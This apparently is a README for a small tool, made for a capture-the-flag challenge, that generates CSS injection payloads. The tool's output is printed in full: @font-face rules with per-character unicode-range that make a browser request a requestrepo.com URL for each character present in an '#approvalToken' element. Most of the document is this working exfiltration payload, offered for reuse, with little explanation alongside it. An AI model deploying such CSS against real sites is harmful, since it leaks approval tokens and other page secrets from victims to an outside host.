# css-injection-generator

Simple CSS injection generator. Pass in a dictionary of characters and generate CSS that checks for the presence of said characters on the page.

### Why?  

I made this for a CTF challenge because I'm lazy.


### Usage  

1. Open the script in your preferred editor
2. Configure your `target_element` CSS selector (default: `#approvalToken`)
3. Add any extra CSS as-needed  
4. Configure your `endpoint`, which is the remote server where the characters will be leaked to. Default is a throwaway requestrepo.com link.  
5. Configure your `dict` character dictionary. Default is `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`.
6. Run `node index.js`

Alternatively, you could also take this code and stick it in a NodeJS http controller and service it directly instead of logging to the console.

Output with all default params will be:  

```css
@font-face{font-family:'f_a';src:url('//newi7t6m.requestrepo.com?c=a');unicode-range:U+61 }
@font-face{font-family:'f_b';src:url('//newi7t6m.requestrepo.com?c=b');unicode-range:U+62 }
@font-face{font-family:'f_c';src:url('//newi7t6m.requestrepo.com?c=c');unicode-range:U+63 }
@font-face{font-family:'f_d';src:url('//newi7t6m.requestrepo.com?c=d');unicode-range:U+64 }
@font-face{font-family:'f_e';src:url('//newi7t6m.requestrepo.com?c=e');unicode-range:U+65 }
@font-face{font-family:'f_f';src:url('//newi7t6m.requestrepo.com?c=f');unicode-range:U+66 }
@font-face{font-family:'f_g';src:url('//newi7t6m.requestrepo.com?c=g');unicode-range:U+67 }
@font-face{font-family:'f_h';src:url('//newi7t6m.requestrepo.com?c=h');unicode-range:U+68 }
@font-face{font-family:'f_i';src:url('//newi7t6m.requestrepo.com?c=i');unicode-range:U+69 }
@font-face{font-family:'f_j';src:url('//newi7t6m.requestrepo.com?c=j');unicode-range:U+6A }
@font-face{font-family:'f_k';src:url('//newi7t6m.requestrepo.com?c=k');unicode-range:U+6B }
@font-face{font-family:'f_l';src:url('//newi7t6m.requestrepo.com?c=l');unicode-range:U+6C }
@font-face{font-family:'f_m';src:url('//newi7t6m.requestrepo.com?c=m');unicode-range:U+6D }
@font-face{font-family:'f_n';src:url('//newi7t6m.requestrepo.com?c=n');unicode-range:U+6E }
@font-face{font-family:'f_o';src:url('//newi7t6m.requestrepo.com?c=o');unicode-range:U+6F }
@font-face{font-family:'f_p';src:url('//newi7t6m.requestrepo.com?c=p');unicode-range:U+70 }
@font-face{font-family:'f_q';src:url('//newi7t6m.requestrepo.com?c=q');unicode-range:U+71 }
@font-face{font-family:'f_r';src:url('//newi7t6m.requestrepo.com?c=r');unicode-range:U+72 }
@font-face{font-family:'f_s';src:url('//newi7t6m.requestrepo.com?c=s');unicode-range:U+73 }
@font-face{font-family:'f_t';src:url('//newi7t6m.requestrepo.com?c=t');unicode-range:U+74 }
@font-face{font-family:'f_u';src:url('//newi7t6m.requestrepo.com?c=u');unicode-range:U+75 }
@font-face{font-family:'f_v';src:url('//newi7t6m.requestrepo.com?c=v');unicode-range:U+76 }
@font-face{font-family:'f_w';src:url('//newi7t6m.requestrepo.com?c=w');unicode-range:U+77 }
@font-face{font-family:'f_x';src:url('//newi7t6m.requestrepo.com?c=x');unicode-range:U+78 }
@font-face{font-family:'f_y';src:url('//newi7t6m.requestrepo.com?c=y');unicode-range:U+79 }
@font-face{font-family:'f_z';src:url('//newi7t6m.requestrepo.com?c=z');unicode-range:U+7A }
@font-face{font-family:'f_A';src:url('//newi7t6m.requestrepo.com?c=A');unicode-range:U+41 }
@font-face{font-family:'f_B';src:url('//newi7t6m.requestrepo.com?c=B');unicode-range:U+42 }
@font-face{font-family:'f_C';src:url('//newi7t6m.requestrepo.com?c=C');unicode-range:U+43 }
@font-face{font-family:'f_D';src:url('//newi7t6m.requestrepo.com?c=D');unicode-range:U+44 }
@font-face{font-family:'f_E';src:url('//newi7t6m.requestrepo.com?c=E');unicode-range:U+45 }
@font-face{font-family:'f_F';src:url('//newi7t6m.requestrepo.com?c=F');unicode-range:U+46 }
@font-face{font-family:'f_G';src:url('//newi7t6m.requestrepo.com?c=G');unicode-range:U+47 }
@font-face{font-family:'f_H';src:url('//newi7t6m.requestrepo.com?c=H');unicode-range:U+48 }
@font-face{font-family:'f_I';src:url('//newi7t6m.requestrepo.com?c=I');unicode-range:U+49 }
@font-face{font-family:'f_J';src:url('//newi7t6m.requestrepo.com?c=J');unicode-range:U+4A }
@font-face{font-family:'f_K';src:url('//newi7t6m.requestrepo.com?c=K');unicode-range:U+4B }
@font-face{font-family:'f_L';src:url('//newi7t6m.requestrepo.com?c=L');unicode-range:U+4C }
@font-face{font-family:'f_M';src:url('//newi7t6m.requestrepo.com?c=M');unicode-range:U+4D }
@font-face{font-family:'f_N';src:url('//newi7t6m.requestrepo.com?c=N');unicode-range:U+4E }
@font-face{font-family:'f_O';src:url('//newi7t6m.requestrepo.com?c=O');unicode-range:U+4F }
@font-face{font-family:'f_P';src:url('//newi7t6m.requestrepo.com?c=P');unicode-range:U+50 }
@font-face{font-family:'f_Q';src:url('//newi7t6m.requestrepo.com?c=Q');unicode-range:U+51 }
@font-face{font-family:'f_R';src:url('//newi7t6m.requestrepo.com?c=R');unicode-range:U+52 }
@font-face{font-family:'f_S';src:url('//newi7t6m.requestrepo.com?c=S');unicode-range:U+53 }
@font-face{font-family:'f_T';src:url('//newi7t6m.requestrepo.com?c=T');unicode-range:U+54 }
@font-face{font-family:'f_U';src:url('//newi7t6m.requestrepo.com?c=U');unicode-range:U+55 }
@font-face{font-family:'f_V';src:url('//newi7t6m.requestrepo.com?c=V');unicode-range:U+56 }
@font-face{font-family:'f_W';src:url('//newi7t6m.requestrepo.com?c=W');unicode-range:U+57 }
@font-face{font-family:'f_X';src:url('//newi7t6m.requestrepo.com?c=X');unicode-range:U+58 }
@font-face{font-family:'f_Y';src:url('//newi7t6m.requestrepo.com?c=Y');unicode-range:U+59 }
@font-face{font-family:'f_Z';src:url('//newi7t6m.requestrepo.com?c=Z');unicode-range:U+5A }
@font-face{font-family:'f_0';src:url('//newi7t6m.requestrepo.com?c=0');unicode-range:U+30 }
@font-face{font-family:'f_1';src:url('//newi7t6m.requestrepo.com?c=1');unicode-range:U+31 }
@font-face{font-family:'f_2';src:url('//newi7t6m.requestrepo.com?c=2');unicode-range:U+32 }
@font-face{font-family:'f_3';src:url('//newi7t6m.requestrepo.com?c=3');unicode-range:U+33 }
@font-face{font-family:'f_4';src:url('//newi7t6m.requestrepo.com?c=4');unicode-range:U+34 }
@font-face{font-family:'f_5';src:url('//newi7t6m.requestrepo.com?c=5');unicode-range:U+35 }
@font-face{font-family:'f_6';src:url('//newi7t6m.requestrepo.com?c=6');unicode-range:U+36 }
@font-face{font-family:'f_7';src:url('//newi7t6m.requestrepo.com?c=7');unicode-range:U+37 }
@font-face{font-family:'f_8';src:url('//newi7t6m.requestrepo.com?c=8');unicode-range:U+38 }
@font-face{font-family:'f_9';src:url('//newi7t6m.requestrepo.com?c=9');unicode-range:U+39 }

#approvalToken{font-family:'f_a','f_b','f_c','f_d','f_e','f_f','f_g','f_h','f_i','f_j','f_k','f_l','f_m','f_n','f_o','f_p','f_q','f_r','f_s','f_t','f_u','f_v','f_w','f_x','f_y','f_z','f_A','f_B','f_C','f_D','f_E','f_F','f_G','f_H','f_I','f_J','f_K','f_L','f_M','f_N','f_O','f_P','f_Q','f_R','f_S','f_T','f_U','f_V','f_W','f_X','f_Y','f_Z','f_0','f_1','f_2','f_3','f_4','f_5','f_6','f_7','f_8','f_9'; display: block !important;}
```
